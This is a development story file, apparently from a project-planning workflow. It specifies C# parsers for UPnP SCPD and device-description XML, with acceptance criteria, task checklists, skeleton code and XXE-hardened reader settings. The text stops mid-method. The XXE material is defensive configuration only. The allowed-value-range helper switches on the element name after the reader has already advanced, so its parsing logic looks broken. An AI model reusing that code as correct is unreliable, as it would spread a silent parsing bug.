---
baseline_commit: 609e08ced3fefda3077963fe60ab5c58c209be72
---

# Story 1.4: XML Parsers — SCPD Streaming + Device Description with XXE Defence

Status: done

<!-- Note: Validation is optional. Run validate-create-story for quality check before dev-story. -->

## Story

As an **ohSpy developer**,
I want **incremental SCPD streaming via `IAsyncEnumerable<ScpdAction>` and a device-description parser, both with XXE-locked `XmlReaderSettings`**,
so that **subsequent stories can parse arbitrary LAN device XML without freezing the UI on 200-action SCPDs and without exposing the host filesystem to malicious DTD entity attacks**.

## Acceptance Criteria

> Each AC is restated verbatim from epics.md §Story 1.4 (lines 583–633). The architecture-level AC IDs (D5, Pattern 9, AC-5.1..AC-5.5) cited inline trace back to architecture.md §Decision-5.

### AC-1 — `IScpdParser` interface surface (D5)

**Given** `ohSpy.Core/Scpd/IScpdParser.cs`
**When** I inspect the interface
**Then** it declares `IAsyncEnumerable<ScpdAction> StreamActionsAsync(Stream xml, CancellationToken ct)` and `Task<ScpdStateTable> ReadStateTableAsync(Stream xml, CancellationToken ct)` (D5)

### AC-2 — Model records are sealed (Pattern 9)

**Given** `ohSpy.Core/Models/` ScpdAction / ScpdArgument / ScpdDirection / ScpdStateTable / ScpdStateVariable / ScpdAllowedValueRange
**When** I inspect them
**Then** they are `public sealed record` types with the shape defined in D5 (Pattern 9)

### AC-3 — XXE-locked `XmlReaderSettings`

**Given** the parser's `XmlReaderSettings`
**When** any parse starts
**Then** the settings have `Async=true`, `DtdProcessing=DtdProcessing.Prohibit`, `XmlResolver=null`, `IgnoreComments=true`, `IgnoreWhitespace=true`, `MaxCharactersInDocument=4_000_000` (D5)
**And** the same settings are used by the device-description parser

### AC-4 — Incremental SCPD streaming (AC-5.1 / FR-100)

**Given** a 200-action SCPD fixture (`tests/Fixtures/Scpds/igd-router-200action.xml` per the epic text — note: this story chooses to generate the 200-action SCPD in-test via `BuildLargeScpd(200)` rather than commit a 200KB+ XML file; the conceptual fixture identity matches the epic AC text)
**When** I `await foreach` over `StreamActionsAsync`
**Then** actions emit one-by-one as they parse (not as a single batch at the end) (AC-5.1)
**And** there is an `await Task.Yield()` between each emitted action (verifiable via consumer-side iteration timing — no individual iteration > 16 ms)
**And** total parse completes within ~2 s on the test baseline (AC-5.1 cold-large-SCPD budget)

### AC-5 — Malformed SCPD throws after delivering valid actions (AC-5.2)

**Given** a malformed SCPD fixture (`tests/Fixtures/Scpds/malformed-mid-document.xml`) that breaks at action N
**When** I `await foreach`
**Then** actions 0..N-1 are yielded successfully
**And** the next iteration throws `UpnpProtocolException` (AC-5.2)

### AC-6 — XXE attempt blocked (AC-5.3)

**Given** an XXE-attempt fixture (`tests/Fixtures/Scpds/xxe-attempt.xml`) with a `<!DOCTYPE ... [<!ENTITY ...>]>` declaration
**When** I attempt to parse it
**Then** `UpnpProtocolException` is thrown (AC-5.3)
**And** no filesystem read happens (no entity is resolved; `XmlResolver = null`)

### AC-7 — Cancellation propagates + disposes reader (AC-5.4)

**Given** any in-progress streaming parse
**When** I cancel the `CancellationToken` mid-document
**Then** `OperationCanceledException` propagates at the next yield (AC-5.4)
**And** the `XmlReader` is disposed (via `using` in the parser impl)

### AC-8 — State-table parser handles constraints (AC-5.5)

**Given** the state-table parser
**When** I call `ReadStateTableAsync` over an SCPD that declares `<stateVariable>` entries with `<allowedValueList>`, `<allowedValueRange>`, and `<defaultValue>`
**Then** every state variable is parsed correctly and `ScpdStateTable.ByName` returns the right `ScpdStateVariable` for each name (AC-5.5)
**And** `ScpdAllowedValueRange.Step` is null when the SCPD omits `<step>`

### AC-9 — Device-description parser (FR-053 flattening)

**Given** `ohSpy.Core/Scpd/IDeviceDescriptionParser.cs` + `DeviceDescriptionParser.cs`
**When** I parse a typical device-description XML
**Then** the parser extracts `<friendlyName>`, `<deviceType>`, `<UDN>`, `<presentationURL>`, `<manufacturer>`, `<manufacturerURL>`, `<modelName>`, `<modelNumber>`, `<modelDescription>`, `<modelURL>`, `<serialNumber>`, `<UPC>`, `<serviceList>` (with `<service>` entries carrying `<serviceType>`, `<serviceId>`, `<SCPDURL>`, `<controlURL>`, `<eventSubURL>`), and `<deviceList>` (recursive — embedded children flattened per FR-053)
**And** the same XmlReaderSettings discipline applies

## Tasks / Subtasks

> Tasks ordered: model records first (pure data, no I/O), then `XmlReaderSettings` helper, then SCPD parser, then device-description parser, then DI wiring, then tests + fixtures. AC mappings explicit. Architecture's pinned patterns are the contract — do not deviate.

### Task 1 — Author SCPD model records (Core/Models, Pattern 9) (AC: #2)

- [x] **1.1** Create folder `src/ohSpy.Core/Models/`.
- [x] **1.2** Create `src/ohSpy.Core/Models/ScpdDirection.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>Direction of a SCPD action argument. Maps to UPnP's <c>&lt;direction&gt;</c> element values.</summary>
  public enum ScpdDirection { In, Out }
  ```
- [x] **1.3** Create `src/ohSpy.Core/Models/ScpdArgument.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// A single argument on a SCPD action. <see cref="RelatedStateVariable"/> links back into
  /// <see cref="ScpdStateTable"/> for type / constraint lookup (used by FR-102 / FR-103 invocation popup).
  /// </summary>
  public sealed record ScpdArgument(
      string Name,
      string RelatedStateVariable,
      ScpdDirection Direction);
  ```
- [x] **1.4** Create `src/ohSpy.Core/Models/ScpdAction.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// A single SCPD action — name + ordered input and output argument lists.
  /// Yielded one at a time by <c>IScpdParser.StreamActionsAsync</c> (FR-100 incremental parse).
  /// </summary>
  public sealed record ScpdAction(
      string Name,
      IReadOnlyList<ScpdArgument> Inputs,
      IReadOnlyList<ScpdArgument> Outputs);
  ```
- [x] **1.5** Create `src/ohSpy.Core/Models/ScpdAllowedValueRange.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// Numeric range constraint on a <see cref="ScpdStateVariable"/>. <see cref="Step"/> is nullable
  /// per AC-5.5: SCPD may omit <c>&lt;step&gt;</c>, in which case the value is unconstrained.
  /// </summary>
  public sealed record ScpdAllowedValueRange(double Minimum, double Maximum, double? Step);
  ```
- [x] **1.6** Create `src/ohSpy.Core/Models/ScpdStateVariable.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// A SCPD state variable — type plus optional default value and value constraints. Consumed
  /// by FR-102 (allowedValueList → dropdown) and FR-103 (allowedValueRange → numeric spinner).
  /// </summary>
  public sealed record ScpdStateVariable(
      string Name,
      string DataType,
      string? DefaultValue,
      IReadOnlyList<string>? AllowedValueList,
      ScpdAllowedValueRange? AllowedValueRange);
  ```
- [x] **1.7** Create `src/ohSpy.Core/Models/ScpdStateTable.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// Table of all SCPD state variables, indexed by name for O(1) lookup. Returned by
  /// <c>IScpdParser.ReadStateTableAsync</c> on demand (lazy — only fetched when the
  /// invocation popup needs to resolve a <see cref="ScpdArgument.RelatedStateVariable"/>).
  /// </summary>
  public sealed record ScpdStateTable(
      IReadOnlyDictionary<string, ScpdStateVariable> ByName);
  ```
- [x] **1.8** Each file: ONE top-level type per `.cs` file (Story 1.2 convention). Namespace `ohSpy.Core.Models`. No XML doc comments beyond the brief one shown above (per CLAUDE.md "no useless comments"; the XML doc serves the IntelliSense surface, not docs-for-docs-sake).

### Task 2 — Author DeviceDescription model records (Core/Models) (AC: #9)

- [x] **2.1** Create `src/ohSpy.Core/Models/ServiceDescription.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// A single UPnP service exposed by a device. URIs (<see cref="ScpdUrl"/>,
  /// <see cref="ControlUrl"/>, <see cref="EventSubUrl"/>) may be relative to the device
  /// description's URLBase / location URL — the parser stores them verbatim; resolution
  /// is the caller's concern.
  /// </summary>
  public sealed record ServiceDescription(
      string ServiceType,    // urn:schemas-upnp-org:service:AVTransport:1
      string ServiceId,      // urn:upnp-org:serviceId:AVTransport
      string ScpdUrl,        // SCPD XML URL (may be relative)
      string ControlUrl,     // SOAP control URL (may be relative)
      string EventSubUrl);   // GENA subscription URL (may be relative)
  ```
- [x] **2.2** Create `src/ohSpy.Core/Models/DeviceDescription.cs`:
  ```csharp
  namespace ohSpy.Core.Models;

  /// <summary>
  /// Parsed device description XML. Root device metadata plus a FLATTENED service list
  /// containing services from the root device AND all recursively embedded devices
  /// (FR-053 three-layer enforcement: only roots are registered; embedded children
  /// flatten into the root's service list).
  /// <para>
  /// All optional fields are nullable. <see cref="Udn"/> (= UPnP <c>&lt;UDN&gt;</c> on the
  /// root device) is the load-bearing identity field — consumers compare it against the
  /// SSDP USN UUID for AC-9.6 mismatched-root backstop.
  /// </para>
  /// </summary>
  public sealed record DeviceDescription(
      string FriendlyName,           // <friendlyName>
      string DeviceType,             // <deviceType>
      string Udn,                    // <UDN> — full "uuid:..." form
      string? PresentationUrl,       // <presentationURL>
      string Manufacturer,           // <manufacturer>
      string? ManufacturerUrl,       // <manufacturerURL>
      string ModelName,              // <modelName>
      string? ModelNumber,           // <modelNumber>
      string? ModelDescription,      // <modelDescription>
      string? ModelUrl,              // <modelURL>
      string? SerialNumber,          // <serialNumber>
      string? Upc,                   // <UPC>
      // Flattened: root services first (in source order), then for each embedded device
      // (in source order) its services followed by its descendants' services (depth-first
      // preorder). Embedded-device metadata is discarded per FR-053.
      IReadOnlyList<ServiceDescription> Services);
  ```
- [x] **2.3** Per FR-053: `Services` is the FLATTENED list. Embedded-device metadata (their `friendlyName`, etc.) is discarded — they're not registered as distinct devices in the tree. Their `<service>` entries get appended to the root's `Services` list, preserving the order they appear in the source XML.

### Task 3 — Author shared `XmlReaderSettings` helper (Core/Scpd) (AC: #3, #6)

- [x] **3.1** Create folder `src/ohSpy.Core/Scpd/`.
- [x] **3.2** Create `src/ohSpy.Core/Scpd/UpnpXmlReaderSettings.cs`:
  ```csharp
  namespace ohSpy.Core.Scpd;

  using System.Xml;

  /// <summary>
  /// Single source of truth for <see cref="XmlReaderSettings"/> applied to ANY UPnP XML
  /// parse (SCPD, device description, SOAP — anywhere we parse XML received from a LAN
  /// device). XXE-locked: DTD prohibited, no external entity resolution, 4M character cap.
  /// </summary>
  internal static class UpnpXmlReaderSettings
  {
      /// <summary>
      /// Returns a fresh <see cref="XmlReaderSettings"/> instance with the project's hardened
      /// settings. Each parse should construct its own (settings are mutable; sharing is
      /// fragile if any consumer mutates).
      /// </summary>
      public static XmlReaderSettings Create() => new XmlReaderSettings
      {
          Async = true,                              // required for ReadAsync (incremental SCPD parse)
          DtdProcessing = DtdProcessing.Prohibit,    // XXE defence — DOCTYPE/ENTITY raise XmlException
          XmlResolver = null,                        // defence-in-depth — no entity ever resolves to filesystem
          IgnoreComments = true,                     // simplify reader loop
          IgnoreWhitespace = true,                   // simplify reader loop
          MaxCharactersInDocument = 4_000_000,       // ~2 MB body cap from Decision 3, doubled for char-vs-byte
      };
  }
  ```
- [x] **3.3** **`internal static`** — only Scpd-folder consumers use this. Don't expose as public surface.
- [x] **3.4** **Return a fresh instance per call** — `XmlReaderSettings` is mutable. If a consumer ever mutates, sharing would propagate. Cheap to construct; one allocation per parse is fine.

### Task 4 — Author `IScpdParser` interface (Core/Scpd) (AC: #1)

- [x] **4.1** Create `src/ohSpy.Core/Scpd/IScpdParser.cs`:
  ```csharp
  namespace ohSpy.Core.Scpd;

  using ohSpy.Core.Models;

  /// <summary>
  /// Parses Service Control Protocol Description (SCPD) XML. Two methods because the two
  /// consumers have very different access patterns:
  /// <list type="bullet">
  ///   <item><see cref="StreamActionsAsync"/> — incremental, yields one action at a time.
  ///   Consumed by service-node expansion (FR-012) where actions should appear in the tree
  ///   as they parse so a 200-action SCPD doesn't lock the UI (FR-100).</item>
  ///   <item><see cref="ReadStateTableAsync"/> — fetches the entire state-variable table.
  ///   Consumed lazily on first invocation-popup open (FR-102 / FR-103) where the caller
  ///   needs O(1) lookup by argument's <c>RelatedStateVariable</c>.</item>
  /// </list>
  /// </summary>
  public interface IScpdParser
  {
      /// <summary>
      /// Stream actions from the SCPD. The stream awaits <see cref="Task.Yield"/> between
      /// each yielded action so the UI thread can service other work (16 ms per-yield ceiling).
      /// Throws <see cref="Http.UpnpProtocolException"/> wrapping any underlying
      /// <see cref="System.Xml.XmlException"/> on malformed XML / XXE attempt / oversize document.
      /// <para>
      /// <b>Stream contract:</b> the supplied <paramref name="xml"/> must be positioned at
      /// the start of the document; the parser does not seek. The parser does NOT dispose
      /// the stream — caller owns lifetime (typical pattern: <c>using var ms = new MemoryStream(bytes)</c>).
      /// </para>
      /// </summary>
      IAsyncEnumerable<ScpdAction> StreamActionsAsync(Stream xml, CancellationToken ct);

      /// <summary>
      /// Parse the entire state-variable table. Returns a <see cref="ScpdStateTable"/> with
      /// O(1) name lookup. Same exception contract as <see cref="StreamActionsAsync"/>.
      /// </summary>
      Task<ScpdStateTable> ReadStateTableAsync(Stream xml, CancellationToken ct);
  }
  ```
- [x] **4.2** **Parameter ordering:** `Stream` first, `CancellationToken` last (Pattern 6 convention — `CancellationToken ct` is always the LAST parameter).
- [x] **4.3** No overloads accepting `byte[]` directly. Callers wrap: `parser.StreamActionsAsync(new MemoryStream(bytes), ct)`. The `Stream` signature keeps the parser fixture-friendly (file streams, network streams, memory streams all work).

- [x] **4.4** **Pre-add diagnostic categories for downstream consumers.** Story 1.4's parsers don't emit diagnostics directly (no URL context), but Stories 2.3 / 2.6 will wrap `UpnpProtocolException` + emit. Add to `src/ohSpy.Core/Diagnostics/DiagCategories.cs` (created in Story 1.3) — append inside the existing static class:
  ```csharp
  /// <summary>Mandatory context: Url; ErrorText for the wrapped XmlException message.</summary>
  public const string ScpdParse = "Scpd.Parse";

  /// <summary>Mandatory context: DeviceUuid, Url; ErrorText for the wrapped XmlException message.</summary>
  public const string DescriptionParse = "Description.Parse";
  ```
  These constants are unused by Story 1.4's own code; they're declared here so Stories 2.3 / 2.6 don't need to amend the file later.

### Task 5 — Author `XmlReaderScpdParser` impl (Core/Scpd) (AC: #4, #5, #6, #7, #8)

- [x] **5.1** Create `src/ohSpy.Core/Scpd/XmlReaderScpdParser.cs`. Recommended skeleton:
  ```csharp
  namespace ohSpy.Core.Scpd;

  using System.Runtime.CompilerServices;
  using System.Xml;
  using ohSpy.Core.Http;
  using ohSpy.Core.Models;

  /// <summary>
  /// <see cref="XmlReader"/>-backed implementation of <see cref="IScpdParser"/>. Uses
  /// <see cref="XmlReader.ReadAsync"/> for incremental parse + <see cref="Task.Yield"/>
  /// between emitted actions (FR-100 / AC-5.1 / Perf Budget §6 cold-large-SCPD ≤ 2 s).
  /// </summary>
  internal sealed class XmlReaderScpdParser : IScpdParser
  {
      // Placeholder URI used when constructing UpnpProtocolException — parsers don't know
      // the source URL (they take a Stream, not a Uri). Callers are encouraged to catch +
      // re-throw with their known Uri context (see consumer pattern in Story 2.6).
      private static readonly Uri PlaceholderUri = new Uri("about:blank");

      public async IAsyncEnumerable<ScpdAction> StreamActionsAsync(
          Stream xml, [EnumeratorCancellation] CancellationToken ct)
      {
          ArgumentNullException.ThrowIfNull(xml);
          using var reader = XmlReader.Create(xml, UpnpXmlReaderSettings.Create());

          // Yield-outside-try pattern: C# forbids `yield return` inside try-with-catch.
          // Loop reads ONE action into a local under a try (catching XmlException from any
          // reader call, including ReadElementContentAsStringAsync), then yields outside.
          // OperationCanceledException flows through unwrapped — caller-driven cancel is
          // not a protocol error.
          while (true)
          {
              ScpdAction? action;
              bool eof;
              try
              {
                  (action, eof) = await TryReadNextActionAsync(reader, ct).ConfigureAwait(false);
              }
              catch (OperationCanceledException)
              {
                  throw;  // caller cancel — propagate as-is (AC-7)
              }
              catch (XmlException ex)
              {
                  throw new UpnpProtocolException(PlaceholderUri, $"SCPD XML parse failed: {ex.Message}");
              }

              if (eof) yield break;
              if (action is null) continue;   // non-<action> element skipped

              yield return action;
              await Task.Yield();   // FR-100: let UI thread breathe between actions
          }
      }

      // Advances the reader until the next <action> element, reads it, returns
      // (action, eof=false). If end-of-document is hit first, returns (null, eof=true).
      // If a non-<action> element is encountered, returns (null, eof=false) — caller loops again.
      private static async Task<(ScpdAction? action, bool eof)> TryReadNextActionAsync(
          XmlReader reader, CancellationToken ct)
      {
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "action")
              {
                  var action = await ReadActionAsync(reader, ct).ConfigureAwait(false);
                  return (action, false);
              }
          }
          return (null, true);
      }

      public async Task<ScpdStateTable> ReadStateTableAsync(Stream xml, CancellationToken ct)
      {
          ArgumentNullException.ThrowIfNull(xml);
          using var reader = XmlReader.Create(xml, UpnpXmlReaderSettings.Create());

          var byName = new Dictionary<string, ScpdStateVariable>(StringComparer.Ordinal);
          try
          {
              while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
              {
                  if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "stateVariable")
                  {
                      var sv = await ReadStateVariableAsync(reader, ct).ConfigureAwait(false);
                      byName[sv.Name] = sv;   // last-wins on duplicate name (UPnP spec is silent; lenient)
                  }
              }
          }
          catch (XmlException ex)
          {
              throw new UpnpProtocolException(PlaceholderUri, $"SCPD XML parse failed: {ex.Message}");
          }
          return new ScpdStateTable(byName);
      }

      // ── helpers ──

      // Wrap reader.ReadAsync so XmlException becomes UpnpProtocolException with consistent
      // shape. The caller's CT cancellation flows through OperationCanceledException unwrapped.
      // NOTE: ReadElementContentAsStringAsync can ALSO throw XmlException — those are caught
      // by the outer try/catch in StreamActionsAsync / ReadStateTableAsync, NOT here.
      private static async Task<bool> ReadAsyncSafe(XmlReader reader, CancellationToken ct)
      {
          ct.ThrowIfCancellationRequested();
          try
          {
              return await reader.ReadAsync().ConfigureAwait(false);
          }
          catch (XmlException ex)
          {
              throw new UpnpProtocolException(PlaceholderUri, $"SCPD XML parse failed: {ex.Message}");
          }
      }

      private static async Task<ScpdAction> ReadActionAsync(XmlReader reader, CancellationToken ct)
      {
          // Reader is positioned on <action>. Children: <name>, <argumentList><argument>*</argumentList>.
          string? name = null;
          var inputs = new List<ScpdArgument>();
          var outputs = new List<ScpdArgument>();

          // Read children until matching </action>.
          var depth = reader.Depth;
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType != XmlNodeType.Element)
                  continue;

              switch (reader.LocalName)
              {
                  case "name":
                      name = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "argument":
                      var arg = await ReadArgumentAsync(reader, ct).ConfigureAwait(false);
                      (arg.Direction == ScpdDirection.In ? inputs : outputs).Add(arg);
                      break;
                  // argumentList is the parent of <argument>; we skip the wrapper (default).
              }
          }
          if (name is null)
              throw new UpnpProtocolException(PlaceholderUri, "SCPD action missing <name>");
          return new ScpdAction(name, inputs, outputs);
      }

      private static async Task<ScpdArgument> ReadArgumentAsync(XmlReader reader, CancellationToken ct)
      {
          string? name = null;
          string? related = null;
          ScpdDirection? direction = null;
          var depth = reader.Depth;
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType != XmlNodeType.Element)
                  continue;
              switch (reader.LocalName)
              {
                  case "name":
                      name = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "relatedStateVariable":
                      related = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "direction":
                      var dir = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      direction = string.Equals(dir, "in", StringComparison.OrdinalIgnoreCase)
                          ? ScpdDirection.In
                          : ScpdDirection.Out;
                      break;
              }
          }
          if (name is null || related is null || direction is null)
              throw new UpnpProtocolException(PlaceholderUri, "SCPD argument missing name / direction / relatedStateVariable");
          return new ScpdArgument(name, related, direction.Value);
      }

      private static async Task<ScpdStateVariable> ReadStateVariableAsync(XmlReader reader, CancellationToken ct)
      {
          string? name = null;
          string? dataType = null;
          string? defaultValue = null;
          List<string>? allowedList = null;
          ScpdAllowedValueRange? allowedRange = null;
          var depth = reader.Depth;
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType != XmlNodeType.Element)
                  continue;
              switch (reader.LocalName)
              {
                  case "name":
                      name = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "dataType":
                      dataType = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "defaultValue":
                      defaultValue = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
                      break;
                  case "allowedValueList":
                      allowedList = await ReadAllowedValueListAsync(reader, ct).ConfigureAwait(false);
                      break;
                  case "allowedValueRange":
                      allowedRange = await ReadAllowedValueRangeAsync(reader, ct).ConfigureAwait(false);
                      break;
              }
          }
          if (name is null || dataType is null)
              throw new UpnpProtocolException(PlaceholderUri, "SCPD stateVariable missing name / dataType");
          return new ScpdStateVariable(name, dataType, defaultValue, allowedList, allowedRange);
      }

      private static async Task<List<string>> ReadAllowedValueListAsync(XmlReader reader, CancellationToken ct)
      {
          var values = new List<string>();
          var depth = reader.Depth;
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "allowedValue")
              {
                  values.Add(await reader.ReadElementContentAsStringAsync().ConfigureAwait(false));
              }
          }
          return values;
      }

      private static async Task<ScpdAllowedValueRange> ReadAllowedValueRangeAsync(XmlReader reader, CancellationToken ct)
      {
          double? min = null, max = null, step = null;
          var depth = reader.Depth;
          while (await ReadAsyncSafe(reader, ct).ConfigureAwait(false))
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType != XmlNodeType.Element)
                  continue;
              var text = await reader.ReadElementContentAsStringAsync().ConfigureAwait(false);
              switch (reader.LocalName)
              {
                  case "minimum": double.TryParse(text, System.Globalization.CultureInfo.InvariantCulture, out var minV); min = minV; break;
                  case "maximum": double.TryParse(text, System.Globalization.CultureInfo.InvariantCulture, out var maxV); max = maxV; break;
                  case "step":    double.TryParse(text, System.Globalization.CultureInfo.InvariantCulture, out var stepV); step = stepV; break;
              }
          }
          if (min is null || max is null)
              throw new UpnpProtocolException(PlaceholderUri, "SCPD allowedValueRange missing minimum / maximum");
          return new ScpdAllowedValueRange(min.Value, max.Value, step);   // AC-5.5: step is null when omitted
      }
  }
  ```
- [x] **5.2** **`internal sealed`** — consumers depend on `IScpdParser`; nothing references the impl directly outside DI.
- [x] **5.3** **`[EnumeratorCancellation]`** on the `StreamActionsAsync` CT parameter — required by the C# compiler for `IAsyncEnumerable` cancellation-token-flow.
- [x] **5.4** **Every `await` uses `.ConfigureAwait(false)`** — Pattern 6 Core convention.
- [x] **5.5** **`ReadAsyncSafe` wraps every `reader.ReadAsync()`** — uniform `XmlException → UpnpProtocolException` conversion in one place. `OperationCanceledException` flows through unwrapped (caller-driven cancel).
- [x] **5.6** **`PlaceholderUri = about:blank`** — the parser doesn't know the source URL. Callers (Story 2.3 / Story 2.6) are expected to catch `UpnpProtocolException` and re-throw with their known `Uri` if they want the diagnostic context to carry it. Document this clearly in the interface XML doc (Task 4.1 mentions it).
- [x] **5.7** **`using var reader`** disposes on success AND on exception path (AC-7) — no `await using` needed since `XmlReader.Dispose` is synchronous.
- [x] **5.8** **`StringComparer.Ordinal` on the ByName dictionary** — UPnP state-variable names are case-sensitive. Use ordinal, NOT InvariantCultureIgnoreCase.
- [x] **5.9** **Locale-invariant double parsing** — pass `CultureInfo.InvariantCulture` to `double.TryParse` for `<minimum>` / `<maximum>` / `<step>`. SCPD uses `.` as decimal separator regardless of host locale.

### Task 6 — Author `IDeviceDescriptionParser` + impl (Core/Scpd) (AC: #9)

- [x] **6.1** Create `src/ohSpy.Core/Scpd/IDeviceDescriptionParser.cs`:
  ```csharp
  namespace ohSpy.Core.Scpd;

  using ohSpy.Core.Models;

  /// <summary>
  /// Parses a UPnP device description XML document (the response to a GET of the SSDP
  /// <c>LOCATION</c> URL). Synchronous because device descriptions are small (≤ 20 KB
  /// typical; Decision 3 caps at 1 MB) — no need for incremental yield discipline.
  /// </summary>
  public interface IDeviceDescriptionParser
  {
      /// <summary>
      /// Parse <paramref name="xml"/>; return the root device's metadata plus a
      /// FLATTENED service list (root services + recursive embedded-device services
      /// per FR-053). Throws <see cref="Http.UpnpProtocolException"/> on malformed XML /
      /// XXE attempt / oversize document.
      /// </summary>
      DeviceDescription Parse(byte[] xml);
  }
  ```
- [x] **6.2** Create `src/ohSpy.Core/Scpd/DeviceDescriptionParser.cs`:
  ```csharp
  namespace ohSpy.Core.Scpd;

  using System.Xml;
  using ohSpy.Core.Http;
  using ohSpy.Core.Models;

  /// <summary>
  /// <see cref="XmlReader"/>-backed implementation of <see cref="IDeviceDescriptionParser"/>.
  /// Synchronous: <see cref="XmlReader.Read"/> over a <see cref="MemoryStream"/>. Same
  /// XXE-locked settings as <see cref="XmlReaderScpdParser"/>.
  /// </summary>
  internal sealed class DeviceDescriptionParser : IDeviceDescriptionParser
  {
      private static readonly Uri PlaceholderUri = new Uri("about:blank");

      public DeviceDescription Parse(byte[] xml)
      {
          ArgumentNullException.ThrowIfNull(xml);
          using var stream = new MemoryStream(xml);
          // Sync API — XmlReaderSettings.Async still true (it's a property of capability,
          // not of usage; synchronous reads work on an async-capable reader).
          using var reader = XmlReader.Create(stream, UpnpXmlReaderSettings.Create());

          try
          {
              // Navigate to the root <device> element. Skip <?xml?>, <root>, <specVersion>.
              while (reader.Read())
              {
                  if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "device")
                      return ReadDevice(reader, includeEmbeddedServices: true);
              }
              throw new UpnpProtocolException(PlaceholderUri, "device description missing root <device>");
          }
          catch (XmlException ex)
          {
              throw new UpnpProtocolException(PlaceholderUri, $"device description XML parse failed: {ex.Message}");
          }
      }

      // Reads ONE <device> element. If includeEmbeddedServices=true, recurses into
      // <deviceList><device> entries and appends their services (FR-053 flattening).
      private static DeviceDescription ReadDevice(XmlReader reader, bool includeEmbeddedServices)
      {
          string friendlyName = "", deviceType = "", udn = "", manufacturer = "", modelName = "";
          string? presentationUrl = null, manufacturerUrl = null, modelNumber = null,
                  modelDescription = null, modelUrl = null, serialNumber = null, upc = null;
          var services = new List<ServiceDescription>();

          var depth = reader.Depth;
          while (reader.Read())
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth)
                  break;
              if (reader.NodeType != XmlNodeType.Element)
                  continue;

              switch (reader.LocalName)
              {
                  case "friendlyName":     friendlyName     = reader.ReadElementContentAsString(); break;
                  case "deviceType":       deviceType       = reader.ReadElementContentAsString(); break;
                  case "UDN":              udn              = reader.ReadElementContentAsString(); break;
                  case "presentationURL":  presentationUrl  = reader.ReadElementContentAsString(); break;
                  case "manufacturer":     manufacturer     = reader.ReadElementContentAsString(); break;
                  case "manufacturerURL":  manufacturerUrl  = reader.ReadElementContentAsString(); break;
                  case "modelName":        modelName        = reader.ReadElementContentAsString(); break;
                  case "modelNumber":      modelNumber      = reader.ReadElementContentAsString(); break;
                  case "modelDescription": modelDescription = reader.ReadElementContentAsString(); break;
                  case "modelURL":         modelUrl         = reader.ReadElementContentAsString(); break;
                  case "serialNumber":     serialNumber     = reader.ReadElementContentAsString(); break;
                  case "UPC":              upc              = reader.ReadElementContentAsString(); break;
                  case "serviceList":      ReadServiceList(reader, services); break;
                  case "deviceList":       if (includeEmbeddedServices) ReadEmbeddedDeviceList(reader, services); break;
              }
          }
          return new DeviceDescription(
              friendlyName, deviceType, udn,
              presentationUrl, manufacturer, manufacturerUrl,
              modelName, modelNumber, modelDescription, modelUrl,
              serialNumber, upc, services);
      }

      private static void ReadServiceList(XmlReader reader, List<ServiceDescription> sink)
      {
          var depth = reader.Depth;
          while (reader.Read())
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth) break;
              if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "service")
                  sink.Add(ReadService(reader));
          }
      }

      private static ServiceDescription ReadService(XmlReader reader)
      {
          string serviceType = "", serviceId = "", scpdUrl = "", controlUrl = "", eventSubUrl = "";
          var depth = reader.Depth;
          while (reader.Read())
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth) break;
              if (reader.NodeType != XmlNodeType.Element) continue;
              switch (reader.LocalName)
              {
                  case "serviceType": serviceType = reader.ReadElementContentAsString(); break;
                  case "serviceId":   serviceId   = reader.ReadElementContentAsString(); break;
                  case "SCPDURL":     scpdUrl     = reader.ReadElementContentAsString(); break;
                  case "controlURL":  controlUrl  = reader.ReadElementContentAsString(); break;
                  case "eventSubURL": eventSubUrl = reader.ReadElementContentAsString(); break;
              }
          }
          return new ServiceDescription(serviceType, serviceId, scpdUrl, controlUrl, eventSubUrl);
      }

      // FR-053 flattening: walk <deviceList><device>+ recursively, append every embedded
      // device's services to the SAME root services list. Embedded device metadata is
      // discarded (not tracked as a separate device; only roots register).
      private static void ReadEmbeddedDeviceList(XmlReader reader, List<ServiceDescription> rootSink)
      {
          var depth = reader.Depth;
          while (reader.Read())
          {
              if (reader.NodeType == XmlNodeType.EndElement && reader.Depth == depth) break;
              if (reader.NodeType == XmlNodeType.Element && reader.LocalName == "device")
              {
                  // Recurse: read this embedded device, but FLATTEN — capture its services
                  // (and its embedded children's services) into the same rootSink.
                  var embedded = ReadDevice(reader, includeEmbeddedServices: true);
